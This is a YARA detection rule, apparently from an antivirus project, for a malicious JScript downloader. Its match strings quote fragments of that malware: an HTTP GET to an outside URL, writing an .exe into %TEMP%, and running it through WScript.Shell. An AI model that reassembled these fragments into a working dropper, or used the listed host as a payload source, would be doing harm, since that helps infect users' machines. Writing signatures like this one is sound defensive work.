rule sig_20160329_df0123d237652011381c4517e823a798 {
  meta:
    description = "datamaliciousorder - file 20160329_df0123d237652011381c4517e823a798.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "42cb68fd631b16ff2752777a1eb94a2ae18e5bd6d9b7a0e3675fb81df18cf342"

  strings:
    $s1  = "S0[H0](\"GET\", \"http://www.deco-dessert.com/k3dua\", false);" fullword ascii
    $s2  = "function Ci() {return He[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HFKJS74Z3rKP.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[q0](hI() * 11); if (S0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var He = function k() {return WScript[P0](\"WScript.Shell\");}(), cl = 11;" fullword ascii
    $s5  = "function W(j, ST){P = P * 1; return j - ST;};" fullword ascii
    $s6  = "function l(){return \"\" + XN;};" fullword ascii
    $s7  = "function H(Pz){He[\"Run\"](Pz, P, P);};" fullword ascii
    $s8  = "function L() {return ((k0 == true) && (k0 == D)) ? 1 : P;};" fullword ascii
    $s9  = "var e = new this[\"Date\"]();" fullword ascii
    $s10 = " while (q){" fullword ascii
    $s11 = "function hI(){return 22;};" fullword ascii
    $s12 = "function Fw(PR) {var B = (1, 2, 3, 4, 5, PR); return B;};" fullword ascii
    $s13 = "function Y(){return P0;};" fullword ascii
    $s14 = "return W(q1, Xr);" fullword ascii
    $s15 = "function wP()" fullword ascii
    $s16 = "var v = false;" fullword ascii
    $s17 = "k0 = true; " fullword ascii
    $s18 = "var k0 = false;" fullword ascii
    $s19 = "} catch(xI){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}